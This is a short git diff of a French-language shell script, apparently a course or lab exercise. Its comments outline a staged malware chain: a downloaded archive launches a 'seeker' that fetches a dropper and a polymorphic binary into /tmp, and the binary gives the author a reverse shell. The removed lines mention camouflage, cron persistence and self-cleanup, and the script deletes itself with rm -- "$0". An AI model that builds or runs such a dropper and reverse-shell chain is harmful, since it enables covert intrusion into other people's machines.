@@ -7,15 +7,17 @@ sleep 3
 rm -- "$0"
 # need to add a command to delete itself
 
+
+
+
 # résumé cours:
-# Jordan télécharge ça -> vulture_seeker.sh  1
-# -> le camoufler si possible
-# -> utiliser mon vps si possible
+# Je télécharge ça -> important.zip et je l'unzip dans mon bureau 1
 # le seeker télécharge -> vulture_executioner.sh et le met dans /tmp 2
 # le seeker télécharge aussi -> vulture_poly.zip 3
-# -> camoufler le zip dans un autre document
-# l'executioner compile et execute -> vulture_poly et ajoute au cronjob 4
-# si l'execution est bonne il supprime tout le monde et lui même, met le binaire poly autrepart 5
+# l'executioner compile et execute -> vulture_poly   4
+# si l'execution est bonne, on aura un reverse shell sur ma machine 5
+
+
 
 # track :
 # pre-stage
